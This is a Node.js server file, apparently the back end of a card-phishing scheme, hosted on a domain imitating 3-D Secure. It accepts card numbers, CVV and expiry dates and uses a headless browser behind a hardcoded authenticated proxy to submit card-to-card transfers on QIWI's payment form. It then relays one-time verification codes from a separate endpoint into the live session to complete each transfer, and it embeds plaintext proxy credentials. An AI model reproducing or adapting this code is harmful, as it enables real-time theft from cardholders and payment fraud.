const puppeteer = require('puppeteer');
const express = require('express');
const cors = require('cors')
const bodyParser = require('body-parser')
const EventEmitter = require('events')

const https = require("https"),
  fs = require("fs");


const options = {
  key: fs.readFileSync("/etc/letsencrypt/live/3-dsec.xyz/privkey.pem"),
  cert: fs.readFileSync("/etc/letsencrypt/live/3-dsec.xyz/fullchain.pem")
};

const app = express()


app.use(bodyParser.urlencoded({ extended: false }))
app.use(bodyParser.json())
app.use(cors())

const inputs_obj = {}

const write_data = async (inputs, page, browser) => {
    const input_list = await page.$$('input')
    input_list.forEach(async (input, idx) => {
      await input.type(inputs[idx].innerHTML)
    })
    console.log(await page.$$('input'))
    try { 

      if(await page.waitForXPath('//*[contains(text(), "Ошибка платежа") or contains(text(), "Платеж проведен")]', {timeout: 60000})) {
         const isOne = !!(await page.$x('//*[contains(text(), "Платеж проведен")]')).length
         console.log(isOne)
         await browser.close()
         return isOne ? 1 : 0
      }
     } catch (e) {
         await browser.close()
         return 0
     }
     await browser.close()
}
const send_html = async (toCard, amount, fromCard,cvv, expireDate, email) => {
    const browser = await puppeteer.launch({args: ['--proxy-server=http://195.216.216.169:56942',' --no-sandbox', '--disable-setuid-sandbox']})
    const page = await browser.newPage()
    await page.authenticate({ username: 'ttNkVLRS', password: '63cYXNdr'})
    await page.setViewport({ width: 1920, height: 984 })
    await page.goto('https://qiwi.com/payment/form/31873')
    console.log(2)

    await setTimeout(() => {}, 5000)
    await page.waitForSelector('#app')
    await page.waitForSelector('.na-source-self-289')
    await page.click('.na-source-self-289')


    await page.waitForSelector('input.mask-text-input-form-field-input-control-self-238')

    const input_fields = await page.$$('input.mask-text-input-form-field-input-control-self-238')
    
    await input_fields[0].type(toCard)
    await input_fields[1].type(amount)
    await input_fields[2].type(fromCard)
    await input_fields[3].type(expireDate)

    await page.type('.hidden-text-input-form-field-input-control-self-319', cvv)

    if(email) await page.type('.text-input-form-field-input-control-self-336', email)

    await page.waitForTimeout(1000);
    await page.click('.submit-button-298')

    await page.waitForNavigation({waitUntil: 'networkidle2'});

    await page.waitForTimeout(5000);

    return {inputs: await page.$$('input'), page, browser}
}
app.post('/sendData', async (req, res) => {
        const {toCard,amount, fromCard, cvv, expireDate, email, id} = req.body
        const {inputs, page, browser} = await send_html(toCard,amount, fromCard, cvv, expireDate, email)
        console.log(inputs[0])
        res.status(200).json({inputs})

        console.log("wait", id)
        const locker = new EventEmitter();
  
        const lockable = async () => {
          const checker = () => {
            setTimeout(() => inputs_obj[id] ? locker.emit('unlocked') : checker(), 1000)
            if(inputs_obj[id]) return
          }
          await checker()
          await new Promise(resolve => locker.once('unlocked', resolve));
          return 
        }
        await lockable()
        console.log('successfully recieved', id)

        await write_data(inputs_obj[id], page, browser)

})
app.post('/sendInputs', async (req, res) => {
  const {inputs, id} = req.body
  inputs_obj[id] = inputs
  return res.status(200)
})

app.listen(5000)
https.createServer(options, app).listen(443);